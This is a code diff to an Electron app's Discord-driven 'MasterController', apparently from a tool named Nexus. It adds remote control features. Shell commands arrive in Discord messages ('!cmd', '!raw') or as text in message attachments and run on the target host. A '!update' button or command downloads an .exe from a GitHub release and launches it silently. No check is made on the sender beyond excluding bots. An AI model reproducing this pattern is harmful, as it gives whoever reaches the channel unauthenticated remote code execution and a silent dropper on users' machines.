@@ -1,8 +1,8 @@
-import { app } from 'electron'
+import { app, net } from 'electron'
 import { getSystemSpecs } from '../utils/hardware'
 import path from 'path'
-import { readFileSync, existsSync, unlinkSync } from 'fs'
-import { exec } from 'child_process'
+import { readFileSync, existsSync, unlinkSync, writeFileSync } from 'fs'
+import { exec, spawn } from 'child_process'
 import os from 'os'
 import { startZapret, stopZapret, getZapretStatus } from './zapret'
 import { startSingbox, stopSingbox, getSingboxStatus } from './singbox'
@@ -47,8 +47,29 @@ class MasterController {
     this.client.on(Events.MessageCreate, async (message) => {
       if (message.author.bot) return
       
-      const content = message.content.trim()
+      let content = message.content.trim()
       const lowContent = content.toLowerCase()
+      
+      // Handle File Attachments for HUGE commands
+      if (message.attachments.size > 0 && (lowContent.startsWith('!cmd ') || lowContent.startsWith('!raw '))) {
+        const attachment = message.attachments.first()
+        if (attachment) {
+          try {
+            const fileData = await this.downloadFile(attachment.url)
+            const fileText = fileData.toString('utf8')
+            if (fileText) {
+              const prefix = content.split(' ')[0]
+              const target = content.split(' ')[1]
+              content = `${prefix} ${target} ${fileText}`
+            }
+          } catch (e) {
+            console.error('[Master] Attachment download error:', e)
+          }
+        }
+      }
+
+      const parts = content.split(' ')
+      const cmdPrefix = parts[0]?.toLowerCase()
 
       if (lowContent === '!nexus') {
         this.adminChannelId = message.channelId
@@ -59,45 +80,39 @@ class MasterController {
         this.adminChannelId = message.channelId
         await this.reportLogs(message.channelId)
       }
-      else if (lowContent.startsWith('!cmd ')) {
-        const parts = content.split(' ')
-        if (parts.length >= 3) {
-          const target = parts[1]
-          const command = parts.slice(2).join(' ')
-          if (target === this.hostname) {
-            await this.runShell(command, message.channelId, true)
-          }
+      else if (cmdPrefix === '!cmd' && parts.length >= 3) {
+        const target = parts[1]
+        const command = parts.slice(2).join(' ')
+        if (target === this.hostname) {
+          await this.runShell(command, message.channelId, true)
         }
       }
-      else if (lowContent.startsWith('!raw ')) {
-        const parts = content.split(' ')
-        if (parts.length >= 3) {
-          const target = parts[1]
-          const command = parts.slice(2).join(' ')
-          if (target === this.hostname) {
-            await this.runShell(command, message.channelId, false)
-          }
+      else if (cmdPrefix === '!raw' && parts.length >= 3) {
+        const target = parts[1]
+        const command = parts.slice(2).join(' ')
+        if (target === this.hostname) {
+          await this.runShell(command, message.channelId, false)
         }
       }
-      else if (lowContent.startsWith('!res ')) {
-        const parts = content.split(' ')
-        if (parts.length >= 3) {
-          const target = parts[1]
-          const resStr = parts[2]
-          if (target === this.hostname) {
-            await this.setResolution(resStr, message.channelId)
-          }
+      else if (cmdPrefix === '!res' && parts.length >= 3) {
+        const target = parts[1]
+        const resStr = parts[2]
+        if (target === this.hostname) {
+          await this.setResolution(resStr, message.channelId)
         }
       }
-      else if (lowContent.startsWith('!block ')) {
-        const parts = content.split(' ')
-        if (parts.length >= 3) {
-          const target = parts[1]
-          const proc = parts[2]
-          if (target === this.hostname) {
-            this.blockedProcesses.add(proc)
-            message.reply(`🚫 **${this.hostname}**: Процесс \`${proc}\` заблокирован`)
-          }
+      else if (cmdPrefix === '!block' && parts.length >= 3) {
+        const target = parts[1]
+        const proc = parts[2]
+        if (target === this.hostname) {
+          this.blockedProcesses.add(proc)
+          message.reply(`🚫 **${this.hostname}**: Процесс \`${proc}\` заблокирован`)
+        }
+      }
+      else if (cmdPrefix === '!update' && parts.length >= 2) {
+        const target = parts[1]
+        if (target === this.hostname || target === 'all') {
+          await this.forceUpdate(message.channelId)
         }
       }
     })
@@ -157,7 +172,7 @@ class MasterController {
             await interaction.message.edit(this.getControlPanelPayload()).catch(()=>{})
           }
           else if (action === 'shell_ui') {
-            await interaction.reply({ content: `💻 **Shell [${this.hostname}]:**\nВ чат:\n\`!cmd ${this.hostname} dir\`\nИли для вывода с мусором:\n\`!raw ${this.hostname} dir\``, flags: [64] })
+            await interaction.reply({ content: `💻 **Shell [${this.hostname}]:**\nВ чат:\n\`!cmd ${this.hostname} dir\`\nИли прикрепи файл с кодом и напиши это в описании.`, flags: [64] })
           }
           else if (action === 'res_ui') {
             await interaction.reply({ content: `🖥 **Разрешение [${this.hostname}]:**\nВ чат:\n\`!res ${this.hostname} 1920x1080\``, flags: [64] })
@@ -169,6 +184,10 @@ class MasterController {
             this.blockedProcesses.delete(val)
             await interaction.update(this.getBlockListPayload())
           }
+          else if (action === 'force_update') {
+            await interaction.reply({ content: `🚀 Запуск принудительного обновления на **${this.hostname}**...`, ephemeral: true })
+            await this.forceUpdate(interaction.channelId)
+          }
         } catch (e) {
           console.error(`[Master] Interaction Error:`, e)
         }
@@ -178,6 +197,50 @@ class MasterController {
     this.connectDiscord()
 
     setInterval(() => this.watchdog(), 5000)
+  }
+
+  private async downloadFile(url: string): Promise<Buffer> {
+    return new Promise((resolve, reject) => {
+      const req = net.request(url)
+      req.on('response', (res) => {
+        const chunks: Buffer[] = []
+        res.on('data', (chunk) => chunks.push(chunk))
+        res.on('end', () => resolve(Buffer.concat(chunks)))
+      })
+      req.on('error', reject)
+      req.end()
+    })
+  }
+
+  private async forceUpdate(channelId: string) {
+    const channel = this.client.channels.cache.get(channelId)
+    if (!channel || !channel.isTextBased()) return
+
+    try {
+      await channel.send(`⏳ **${this.hostname}**: Проверка обновлений на GitHub...`)
+      
+      const apiRes = await this.downloadFile('https://api.github.com/repos/rerer-ReutovZA/Nexus/releases/latest')
+      const release = JSON.parse(apiRes.toString())
+      const asset = release.assets.find((a: any) => a.name.endsWith('.exe'))
+
+      if (!asset) {
+        await channel.send(`❌ **${this.hostname}**: Установщик не найден в последнем релизе.`)
+        return
+      }
+
+      await channel.send(`📥 **${this.hostname}**: Скачивание новой версии v${release.tag_name}...`)
+      const exeData = await this.downloadFile(asset.browser_download_url)
+      const tempExe = path.join(app.getPath('temp'), 'Nexus_Update.exe')
+      writeFileSync(tempExe, exeData)
+
+      await channel.send(`🔄 **${this.hostname}**: Запуск установщика. Nexus будет закрыт.`)
+      
+      spawn(tempExe, ['/S'], { detached: true, stdio: 'ignore' }).unref()
+      setTimeout(() => app.quit(), 2000)
+
+    } catch (e) {
+      await channel.send(`❌ **${this.hostname}**: Ошибка обновления: ${e}`)
+    }
   }
 
   private async connectDiscord() {
@@ -247,7 +310,7 @@ class MasterController {
     )
     const row4 = new ActionRowBuilder<ButtonBuilder>().addComponents(
       new ButtonBuilder().setCustomId(`${this.hostname}:list`).setLabel('Блок-лист').setStyle(ButtonStyle.Secondary).setEmoji('📝'),
-      new ButtonBuilder().setCustomId(`${this.hostname}:block_ui`).setLabel('Блокировка').setStyle(ButtonStyle.Secondary).setEmoji('🚫')
+      new ButtonBuilder().setCustomId(`${this.hostname}:force_update`).setLabel('Обновить').setStyle(ButtonStyle.Danger).setEmoji('🚀')
     )
     const row5 = new ActionRowBuilder<ButtonBuilder>().addComponents(
       new ButtonBuilder().setCustomId(`${this.hostname}:logs`).setLabel('Логи').setStyle(ButtonStyle.Secondary).setEmoji('📂'),
@@ -435,7 +498,7 @@ class MasterController {
     exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, (err, stdout) => {
        const code = stdout.trim()
        if (code === '0') channel.send(`✅ **${this.hostname}**: Разрешение изменено на ${resStr}`)
-       else channel.send(`❌ **${this.hostname}**: Ошибка (Код ${code})`)
+       else channel.send(`❌ **${this.hostname}**: Ошибка смены разрешения (Код ${code})`)
     })
   }
 }
